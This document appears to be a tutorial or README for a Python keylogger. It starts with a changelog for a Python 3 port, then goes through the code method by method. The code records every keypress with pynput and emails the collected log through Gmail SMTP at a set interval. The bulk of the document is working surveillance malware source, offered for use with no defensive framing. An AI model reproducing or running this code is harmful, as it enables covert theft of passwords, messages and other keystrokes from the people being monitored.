```
Changes Made:
	1.	Python 3 Interpreter Path: Updated the shebang to #!/usr/bin/env python3.
	2.	String Concatenation: Used += for string concatenation in append_to_log.
	3.	str(key.char) to key.char: Directly used key.char instead of converting it with str.
	4.	Exception Handling for Email Sending: Added a try-except block to handle SMTP errors gracefully.
	5.	key == key.space Updated: Changed to key == pynput.keyboard.Key.space for clarity and compatibility.
	6.	Formatted Strings: Used f-strings for better readability.
	7.	Minor Syntax Adjustments: Ensured compatibility with Python 3 syntax.

Make sure you have the required modules installed:
pip install pynput
```

```
class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
```

<ul>
  <li>self.log: A string to store logged keypresses.</li>
  <li>self.interval: Time interval (in seconds) for sending logs via email.</li>
  <li>self.email: Email address used for sending logs.</li>
  <li>self.password: Password for the email account.</li>
</ul>

	

Purpose: Initialize the Keylogger object with required parameters.

```
  def append_to_log(self, string):
      self.log += string
```
<ul>
  <li>Appends each logged keypress (string) to the self.log variable.</li>
</ul>


Purpose: Accumulate keypresses into a single string for periodic reporting.

```
def process_key_press(self, key):
    try:
        current_key = key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            current_key = " "
        else:
            current_key = f" {str(key)} "
    self.append_to_log(current_key)
```

    Purpose: Captures and processes every keypress event.
	Parameter:
	    key: The key event object captured by pynput.
	Behavior:
	    Printable Keys: If key.char is available, log it directly.
	    Special Keys: If key.char isn’t available:
		    Log " " for Key.space.
	    	Log the key name with spaces around it (e.g., " [Shift] ").
	Appends Keypress: Calls append_to_log to add the processed key to self.log.

    Examples:
		Pressing A → Logs: "A"
		Pressing Shift → Logs: " [Shift] "

```
def report(self):
    self.send_mail(self.email, self.password, "\n\n" + self.log)
    self.log = ""
    timer = threading.Timer(self.interval, self.report)
    timer.start()
```

	Purpose: Sends the accumulated key logs via email at regular intervals.
	Behavior:
		Uses send_mail to send the current self.log as an email.
		Clears the self.log after sending.
		Restarts the timer to trigger report after self.interval seconds.

    Example:
		Interval: 60 seconds → Log is emailed every 60 seconds.

```
def send_mail(self, email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")
```


	Purpose: Sends the key logs via email using SMTP.
	Parameters:
		email (str): Sender’s email address.
		password (str): Password for the email account.
		message (str): Content of the log to be emailed.
	Behavior:
		Connects securely to Gmail’s SMTP server (smtp.gmail.com) on port 587.
		Starts a secure connection with starttls.
		Authenticates with the email and password.
		Sends the log as an email.
		Closes the connection with quit.
	Error Handling: If an error occurs during the process, it prints an error message.

```
Example Error Message:
Failed to send email: [Error details]
```
```
def start(self):
    keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
    with keyboard_listener:
        self.report()
        keyboard_listener.join()
```

	Purpose: Starts the keylogger to listen for keyboard events indefinitely.
	Behavior:
		Initializes a pynput.keyboard.Listener.
		Attaches process_key_press to handle every keypress.
		Starts the periodic report method.
		Keeps the listener running indefinitely with keyboard_listener.join().

```
Flow:
	1.	Start listening to keyboard events.
	2.	Log keypresses via process_key_press.
	3.	Periodically send logs via report.
	4.	Keep running until manually stopped.
```

```
if __name__ == "__main__":
    keylogger = Keylogger(time_interval=60, email="your_email@example.com", password="your_password")
    keylogger.start()
```

	Purpose: Initializes and starts the keylogger script when executed directly.
	Behavior:
		Creates an instance of Keylogger.
		Sets the time interval, email, and password.
		Starts the keylogger with start().
